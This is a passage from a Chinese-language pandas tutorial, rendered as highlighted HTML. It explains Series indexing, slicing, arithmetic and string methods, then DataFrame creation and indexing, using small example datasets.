punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="2-隐式索引："><a href="#2-隐式索引：" class="headerlink" title="(2) 隐式索引："></a>(2) 隐式索引：</h5><ul><li>使用整数作为索引值</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">s1 <span class="token operator">=</span> Series<span class="token punctuation">(</span>data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span>index <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token string">'ABCDE'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>s1<span class="token punctuation">.</span>iloc<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">d1 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'yuwen'</span><span class="token punctuation">:</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token string">'shuxue'</span><span class="token punctuation">:</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token string">'yingyu'</span><span class="token punctuation">:</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token string">'lizong'</span><span class="token punctuation">:</span><span class="token number">300</span><span class="token punctuation">}</span>s8 <span class="token operator">=</span> Series<span class="token punctuation">(</span>d1<span class="token punctuation">)</span>s8<span class="token punctuation">.</span>index <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'理综'</span><span class="token punctuation">,</span><span class="token string">'数学'</span><span class="token punctuation">,</span><span class="token string">'英语'</span><span class="token punctuation">,</span><span class="token string">'语文'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>s8<span class="token punctuation">[</span><span class="token string">'数学'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>s8<span class="token punctuation">.</span>loc<span class="token punctuation">[</span><span class="token string">'数学'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>s8<span class="token punctuation">.</span>iloc<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-切片-1"><a href="#2-切片-1" class="headerlink" title="2. 切片"></a>2. 切片</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">a1 <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">s1 <span class="token operator">=</span> Series<span class="token punctuation">(</span>data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span>index <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token string">'ABCDE'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>s1<span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">:</span><span class="token string">'D'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>s1<span class="token punctuation">.</span>loc<span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">:</span><span class="token string">'D'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># 使用.iloc[]注意，此时是右开区间</span><span class="token keyword">print</span><span class="token punctuation">(</span>s1<span class="token punctuation">.</span>iloc<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-Series属性和方法"><a href="#3-Series属性和方法" class="headerlink" title="3. Series属性和方法"></a>3. Series属性和方法</h3><ol><li><p>可以把Series看成一个定长的有序字典</p></li><li><p>可以通过shape、size、index、values等得到series的属性</p></li><li><p>可以使用<code>head()</code>、<code>tail()</code>分别查看前n个和后n个值(当索引没有对应的值时，可能出现缺失数据显示NaN（not a number）的情况)</p></li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">s1 <span class="token operator">=</span> Series<span class="token punctuation">(</span>data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">,</span>index <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token string">'abcdefg'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>s1<span class="token punctuation">.</span>head<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>s1<span class="token punctuation">.</span>tail<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="4"><li>可以使用<code>pd.isnull()</code>，<code>pd.notnull()</code>，或自带<code>isnull()</code>，<code>notnull()</code>函数检测缺失数据</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 返回的仍然是一个Series对象</span>s<span class="token punctuation">.</span>isnull<span class="token punctuation">(</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>notnull<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="5"><li>求和函数</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">s1 <span class="token operator">=</span> Series<span class="token punctuation">(</span>data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>index <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token string">'abcd'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>np<span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="4-Series的运算"><a href="#4-Series的运算" class="headerlink" title="4. Series的运算"></a>4. Series的运算</h3><ol><li>适用于numpy的数组运算也适用于Series</li><li>Series之间的运算</li></ol><ul><li>在运算中自动对齐不同索引的数据</li><li>如果索引不对应，则补NaN</li><li>NaN和任何数运算，结果都为NaN</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">s1 <span class="token operator">=</span> Series<span class="token punctuation">(</span>data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>index <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token string">'abcd'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>s2 <span class="token operator">=</span> Series<span class="token punctuation">(</span>data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span>index <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token string">'cdef'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>s <span class="token operator">=</span> s1 <span class="token operator">+</span> s2<span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>isnull<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>notnull<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我在这里补充一下</p><p>Series和列表类型都是用来装一列一维数据的容器，但其不仅运算速度快很多，也提供了很多方便的方法，做数据运算更加有效率，我们先来看看如果让列表中每个元素相加。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span>list2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span>list_new <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment"># 直接相加是列表的拼接</span><span class="token comment"># list_new = list1 + list2</span><span class="token comment"># print(list_new)</span><span class="token comment"># 实现列表中的每一个元素相加</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>list1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    list_new<span class="token punctuation">.</span>append<span class="token punctuation">(</span>list1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> list2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>list_new<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再看看Series是如何实现的，提供了哪些方法。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">n1 <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span>np<span class="token punctuation">.</span>nan<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>n2 <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span>np<span class="token punctuation">.</span>nan<span class="token punctuation">]</span><span class="token punctuation">)</span>s1 <span class="token operator">=</span> Series<span class="token punctuation">(</span>n1<span class="token punctuation">)</span>s2 <span class="token operator">=</span> Series<span class="token punctuation">(</span>n2<span class="token punctuation">)</span>s1<span class="token punctuation">.</span>add<span class="token punctuation">(</span>s2<span class="token punctuation">,</span>fill_value <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">#加</span>s1<span class="token punctuation">.</span>sub<span class="token punctuation">(</span>s2<span class="token punctuation">,</span>fill_value <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">#减</span>s1<span class="token punctuation">.</span>mul<span class="token punctuation">(</span>s2<span class="token punctuation">,</span>fill_value <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#乘</span>s1<span class="token punctuation">.</span>div<span class="token punctuation">(</span>s2<span class="token punctuation">,</span>fill_value <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#除</span><span class="token comment">#fill_value在元素中包nan时所替代的值</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-Series数据处理"><a href="#5-Series数据处理" class="headerlink" title="5.Series数据处理"></a>5.Series数据处理</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="相关方法"><a href="#相关方法" class="headerlink" title="相关方法"></a>相关方法</h4><table><thead><tr><th>方法</th><th>作用</th></tr></thead><tbody><tr><td>series.str.len()</td><td>字符串长度</td></tr><tr><td>series.str.extract(pattern)</td><td>提取字符串</td></tr><tr><td>series.str.contains(pattern)</td><td>判断是否包含(只能判断单个字符串)</td></tr><tr><td>series.astype(int)</td><td>转换为整数</td></tr><tr><td>series.isin(list)</td><td>判断series中的数据是否存在于列表中</td></tr><tr><td>series.str.split(str)</td><td>字符串分割</td></tr></tbody></table><h4 id="add"><a href="#add" class="headerlink" title="add()"></a>add()</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">series <span class="token operator">=</span> pd<span class="token punctuation">.</span>Series<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># 使用 add 方法将每个元素加1</span>result <span class="token operator">=</span> series<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="series-str-cat-sep-x3D-”-“"><a href="#series-str-cat-sep-x3D-”-“" class="headerlink" title="series.str.cat(sep=” “)"></a>series.str.cat(sep=” “)</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">series <span class="token operator">=</span> pd<span class="token punctuation">.</span>Series<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"Hello"</span><span class="token punctuation">,</span> <span class="token string">"World"</span><span class="token punctuation">,</span> <span class="token string">"!"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># 使用 str.cat 方法将每个元素拼接成一个字符串</span>result <span class="token operator">=</span> series<span class="token punctuation">.</span><span class="token builtin">str</span><span class="token punctuation">.</span>cat<span class="token punctuation">(</span>sep<span class="token operator">=</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="series-str-extract-pattern"><a href="#series-str-extract-pattern" class="headerlink" title="series.str.extract(pattern)"></a>series.str.extract(pattern)</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">data <span class="token operator">=</span> pd<span class="token punctuation">.</span>Series<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'ABC123'</span><span class="token punctuation">,</span> <span class="token string">'DEF456'</span><span class="token punctuation">,</span> <span class="token string">'GHI789'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># 使用正则表达式提取部分字符</span>pattern <span class="token operator">=</span> <span class="token string">r'(\d+)'</span>  <span class="token comment"># 提取连续的数字</span>extracted_data <span class="token operator">=</span> data<span class="token punctuation">.</span><span class="token builtin">str</span><span class="token punctuation">.</span>extract<span class="token punctuation">(</span>pattern<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>extracted_data<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="series-isin-list"><a href="#series-isin-list" class="headerlink" title="series.isin(list)"></a>series.isin(list)</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">data <span class="token operator">=</span> pd<span class="token punctuation">.</span>Series<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'ABC123'</span><span class="token punctuation">,</span> <span class="token string">'DEFasd'</span><span class="token punctuation">,</span> <span class="token string">'GHI789'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>isin<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'ABC123'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="series-str-split-str"><a href="#series-str-split-str" class="headerlink" title="series.str.split(str)"></a>series.str.split(str)</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">data <span class="token operator">=</span> pd<span class="token punctuation">.</span>Series<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'及时雨-宋江'</span><span class="token punctuation">,</span> <span class="token string">'母大虫-杜三娘'</span><span class="token punctuation">,</span> <span class="token string">'鼓上蚤-时迁'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>data <span class="token operator">=</span> data<span class="token punctuation">.</span><span class="token builtin">str</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="二、DataFrame"><a href="#二、DataFrame" class="headerlink" title="二、DataFrame"></a>二、DataFrame</h2><p>DataFrame是一个【表格型】的数据结构，可以看做是【由Series组成的字典】（共用同一个索引）。DataFrame由按一定顺序排列的多列数据组成。设计初衷是将Series的使用场景从一维拓展到多维。DataFrame既有行索引，也有列索引。</p><ul><li>行索引：index</li><li>列索引：columns</li><li>值：values（numpy的二维数组）</li></ul><h3 id="1-DataFrame的创建"><a href="#1-DataFrame的创建" class="headerlink" title="1.  DataFrame的创建"></a>1.  DataFrame的创建</h3><ul><li>最常用的方法是传递一个字典来创建。DataFrame以字典的键作为每一【列】的名称，以字典的值（一个数组）作为每一列。</li><li>字典中的键所对应的值的长度是一样的，不然会报错。</li><li>此外，DataFrame会自动加上每一行的索引（和Series一样）。</li><li>同Series一样，若传入的列与字典的键不匹配，则相应的值为NaN。</li><li>DataFrame属性：values、columns、index、shape</li></ul><h4 id="通过字典创建"><a href="#通过字典创建" class="headerlink" title="通过字典创建"></a>通过字典创建</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">dic1 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'dancer'</span><span class="token punctuation">,</span><span class="token string">'lucy'</span><span class="token punctuation">,</span><span class="token string">'mery'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'age'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'address'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'beijing'</span><span class="token punctuation">,</span><span class="token string">'shanghai'</span><span class="token punctuation">,</span><span class="token string">'guangzhou'</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token comment"># columns 列索引</span>df1 <span class="token operator">=</span> DataFrame<span class="token punctuation">(</span>data <span class="token operator">=</span> dic1<span class="token punctuation">,</span>index <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">dic1 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'张三'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'李四'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span>indexs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'语文'</span><span class="token punctuation">,</span><span class="token string">'数学'</span><span class="token punctuation">,</span><span class="token string">'英语'</span><span class="token punctuation">,</span><span class="token string">'理综'</span><span class="token punctuation">]</span>df1 <span class="token operator">=</span> DataFrame<span class="token punctuation">(</span>data <span class="token operator">=</span> dic1<span class="token punctuation">,</span>index <span class="token operator">=</span> indexs<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="通过numpy-ndarray创建"><a href="#通过numpy-ndarray创建" class="headerlink" title="通过numpy.ndarray创建"></a>通过numpy.ndarray创建</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">data <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">150</span><span class="token punctuation">,</span>size <span class="token operator">=</span> <span class="token number">5</span><span class="token operator">*</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">.</span>reshape<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>index <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'dancer'</span><span class="token punctuation">,</span><span class="token string">'lucy'</span><span class="token punctuation">,</span><span class="token string">'mery'</span><span class="token punctuation">,</span><span class="token string">'tom'</span><span class="token punctuation">,</span><span class="token string">'jack'</span><span class="token punctuation">]</span>columns <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'python'</span><span class="token punctuation">,</span><span class="token string">'c++'</span><span class="token punctuation">,</span><span class="token string">'c#'</span><span class="token punctuation">,</span><span class="token string">'php'</span><span class="token punctuation">,</span><span class="token string">'java'</span><span class="token punctuation">]</span>df2 <span class="token operator">=</span> DataFrame<span class="token punctuation">(</span>data <span class="token operator">=</span> data<span class="token punctuation">,</span> index <span class="token operator">=</span> index<span class="token punctuation">,</span> columns <span class="token operator">=</span> columns<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df2<span class="token punctuation">)</span><span class="token comment"># 这里做一个实验，DataFrame的一列或者一行其实就是一个Series</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>df2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>df2<span class="token punctuation">[</span><span class="token string">'python'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>df2<span class="token punctuation">.</span>loc<span class="token punctuation">[</span><span class="token string">'dancer'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="通过Series创建"><a href="#通过Series创建" class="headerlink" title="通过Series创建"></a>通过Series创建</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">s1 <span class="token operator">=</span> Series<span class="token punctuation">(</span>data <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>index <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token string">'abcdefghij'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>s1 <span class="token operator">=</span> DataFrame<span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="通过多维列表创建"><a href="#通过多维列表创建" class="headerlink" title="通过多维列表创建"></a>通过多维列表创建</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span>columns <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'张三'</span><span class="token punctuation">,</span><span class="token string">'李四'</span><span class="token punctuation">]</span>indexs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'语文'</span><span class="token punctuation">,</span><span class="token string">'数学'</span><span class="token punctuation">,</span><span class="token string">'英语'</span><span class="token punctuation">,</span><span class="token string">'理综'</span><span class="token punctuation">]</span>df <span class="token operator">=</span> DataFrame<span class="token punctuation">(</span>data <span class="token operator">=</span> data<span class="token punctuation">,</span>columns <span class="token operator">=</span> columns<span class="token punctuation">,</span>index <span class="token operator">=</span> indexs<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>注意：</strong>DataFrame的一列或者一行其实就是一个Series，Series可以看作一维的DataFrame。</p><h3 id="2-DataFrame的索引"><a href="#2-DataFrame的索引" class="headerlink" title="2.DataFrame的索引"></a>2.DataFrame的索引</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">dic1 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'张三'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token number">120</span><span class="token punctuation">,</span><span class="token number">130</span><span class="token punctuation">,</span><span class="token number">140</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'李四'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span>indexs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'语文'</span><span class="token punctuation">,</span><span class="token string">'数学'</span><span class="token punctuation">,</span><span class="token string">'英语'</span><span class="token punctuation">,</span><span class="token string">'理综'</span><span class="token punctuation">]</span>df1 <span class="token operator">=</span> DataFrame<span class="token punctuation">(</span>data <span class="token operator">=</span> dic1<span class="token punctuation">,</span>index <span class="token operator">=</span> indexs<span class="token punctuation">)</span><span class="token comment"># 列索引返回的Series拥有原DataFrame相同的索引，且name属性就是相应的列名。</span><span class="token comment"># 通过类似字典的方式</span><span class="token keyword">print</span><span class="token punctuation">(</span>df1<span class="token punctuation">[</span><span class="token string">'张三'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># 通过属性的方式</span><span class="token keyword">print</span><span class="token punctuation">(</span>df1<span class="token punctuation">.</span>张三<span class="token punctuation">)</span><span class="token comment"># 行索引只支持loc或iloc方法进行索引</span><span class="token comment"># 行索引返回一个Series，index为原来的columns。</span><span class="token comment"># loc只能是显式索引</span><span class="token comment"># iloc只能是隐式索引</span><span class="token keyword">print</span><span class="token punctuation">(</span>df1<span class="token punctuation">.</span>loc<span class="token punctuation">[</span><span class="token string">'数学'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df1<span class="token punctuation">.</span>iloc<span class="token 